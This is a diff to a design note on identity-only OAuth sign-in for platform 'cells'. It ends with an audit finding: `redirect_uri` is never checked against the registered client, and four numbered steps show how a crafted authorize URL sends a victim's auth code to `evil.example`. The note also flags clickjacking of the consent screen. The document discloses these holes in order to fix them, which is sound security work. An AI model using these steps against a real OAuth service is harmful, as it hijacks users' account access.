@@ -7,8 +7,8 @@ the first one cheap:
    full-page redirect to `/oauth/authorize`.
 2. Simplify the grant a cell asks for when all it wants is "who are you".
 
-Status: exploration. Nothing here is built yet, but most of (2) turns out to
-already exist server-side.
+Status: (2) is built, (1) is still exploration. Most of (2) already existed
+server-side; the gaps were two small ones, noted below.
 
 ## How sign-in works today
 
@@ -100,10 +100,9 @@ awaits a message rather than returning `Promise<never>`.
 
 ## Part 2 — what a sign-in-only cell should ask for
 
-Today every cell sign-in asks for `workspace:read workspace:write`, because
-that is the kernel's `DEFAULT_SCOPE` (`cells/kernel/client/main.ts:26`) and no
-cell overrides it. shelved calls a bare `login()`
-(`cells/shelved/client/App.tsx:100`).
+Every cell sign-in asked for `workspace:read workspace:write`, because that is
+the kernel's `DEFAULT_SCOPE` (`cells/kernel/client/main.ts:26`) and no cell
+overrode it. shelved called a bare `login()`.
 
 shelved does not read or write the workspace at all. Its data lives in its own
 DynamoDB table keyed by `x-cell-caller` (`cells/shelved/lib/store.ts`), and
@@ -137,36 +136,43 @@ branch):
 Both `handleConsent` and `handleGrantableScopes` already admit it
 (`oauth.ts:396`, `:438`).
 
-### Two gaps stop it working
+### Two gaps stopped it working (both now closed)
 
-- The kernel never asks for it. `login()` defaults to workspace read+write and
-  has no identity-only mode.
-- `cellScopesFor` is derived from `cellCeiling` (`oauth.ts:32`), which returns
+- The kernel never asked for it. `login()` defaulted to workspace read+write
+  with no identity-only mode. It now takes `login({ identity: true })`, which
+  derives `cell:<owner>/<name>:*` from `cellAddress()` and falls back to the
+  default off a cell surface. `ensureAuth` takes the same.
+- `cellScopesFor` was derived from `cellCeiling` (`oauth.ts:32`), which returns
   `null` unless the redirect host ends with `CELL_DOMAIN_SUFFIX`. An apex cell
-  at `/@c15r/shelved` gets an empty list, so requesting `cell:c15r/shelved:*`
-  there is filtered out of `granted` and the consent screen offers nothing.
-  That's the disabled-Authorize-button case the comment on `cellScopesFor`
-  describes, still live for apex paths.
+  at `/@c15r/shelved` got an empty list, so requesting `cell:c15r/shelved:*`
+  there was filtered out of `granted` and the consent screen offered nothing.
+  That was the disabled-Authorize-button case the comment on `cellScopesFor`
+  describes, still live for every apex cell. It now derives from
+  `cellFromRedirect`.
 
-`cellFromRedirect` (`oauth.ts:54`) already parses both forms, host-isolated and
-apex. Deriving `cellScopesFor` from it instead of from `cellCeiling` closes the
-second gap, and doesn't widen anything: the scope is still bounded to the cell
-whose page you're standing on, and it still grants no authority by itself.
+`cellFromRedirect` (`oauth.ts:54`) already parsed both forms, so the second gap
+was a one-line derivation change. It widens nothing: the two agree on the
+host-isolated case, the apex case stays bounded to the cell in the path, and
+the scope still grants no authority by itself. Note it does now trust the
+apex path in the redirect_uri, which is only as trustworthy as the
+redirect_uri itself — see the first item below.
 
 Kernel boot survives it: both `$types` (read at `main.ts:421`) and `$catalog`
 answered normally on the no-workspace-scope probe token, so a cell can boot the
 kernel on an identity-only session.
 
-For the first, something like:
-
-```ts
-// kernel
-login({ identity: true })   // → scope `cell:<owner>/<name>:*` from cellAddress()
-```
-
-shelved's `signIn` becomes `login({ identity: true })` and the consent screen
+shelved's `client/lib/auth.ts` now signs in identity-only, so its consent screen
 reads "Sign in to @c15r/shelved" with one checkbox instead of two workspace
-grants.
+grants. `requestScopes` also stopped unioning `DEFAULT_SCOPE` back in, which
+would have re-asked for the whole workspace at the first incremental widen from
+an identity-only session.
+
+### Deploy order
+
+The platform change has to land before the cell does. A cell asking for
+`cell:c15r/shelved:*` against the old auth service is offered nothing on the
+apex, which is the disabled-Authorize case above. So: platform deploy, then the
+kernel cell, then shelved.
 
 ### What this doesn't cover
 
@@ -175,16 +181,49 @@ needs workspace scope. The identity-only path is for cells whose storage is
 their own table. Anything in between wants the declared write-back prefixes
 from `cell-origin-isolation.md` §4.5, which is a bigger piece and not this.
 
-## Two things found on the way
+## Three things found on the way
 
-- `/oauth/authorize` serves with no `X-Frame-Options` and no
-  `frame-ancestors`. Any site can iframe the consent screen and clickjack
-  Authorize. Shape B needs a `frame-ancestors` policy anyway, so it'd be fixed
-  in passing, but it's a live gap now and independent of any of this.
-- `/webauthn/*` has no CORS, so cell hosts can't run a ceremony against the
-  apex directly. Adding it is what shape C would need to work off-apex, and I'd
-  rather not add it — it's the thing that currently stops a cell-host page from
-  driving a passkey ceremony it shouldn't be driving.
+All pre-existing and independent of the above. The first is the serious one.
+
+### redirect_uri is never checked against the registered client
+
+`handleDCR` stores `redirect_uris` on the client record
+(`services/auth/oauth.ts:360`), and nothing ever reads them back. The two
+`getOAuthClient` lookups (`:456`, `:539`) use the record only for
+`clientName`. `handleConsent` takes `redirectUri` from the request body, mints
+an auth code bound to it, and returns a redirect there. `handleToken` compares
+the presented `redirect_uri` to the one on the code, which is consistency, not
+registration.
+
+So the code goes wherever the authorize URL said:
+
+1. Register a client at `/oauth/register` (open, unauthenticated), or reuse any
+   `client_id` — the redirect isn't tied to it either way.
+2. Craft `/oauth/authorize?client_id=…&redirect_uri=https://evil.example/&code_challenge=<yours>&scope=workspace:read+workspace:write`.
+3. The victim gets the real consent screen on the real origin with a real
+   passkey prompt, and approves.
+4. The code lands on `evil.example`, and is exchanged with the verifier the
+   attacker chose.
+
+PKCE doesn't help: whoever crafted the authorize URL holds the verifier.
+
+The fix is the standard one — exact-match `redirectUri` against
+`client.redirectUris` in `handleConsent`, and reject otherwise. Worth checking
+first what the connected clients (Claude, ChatGPT) actually registered, since
+enforcement breaks any client whose sent URI differs from its registered one.
+
+### /oauth/authorize can be framed
+
+No `X-Frame-Options` and no `frame-ancestors`, so any site can iframe the
+consent screen and clickjack Authorize. Shape B needs a `frame-ancestors`
+policy anyway, so it'd be fixed in passing.
+
+### /webauthn/* has no CORS
+
+Cell hosts can't run a ceremony against the apex directly. Adding it is what
+shape C would need to work off-apex, and I'd rather not add it — it's the thing
+that currently stops a cell-host page from driving a passkey ceremony it
+shouldn't be driving.
 
 ## Open questions
 
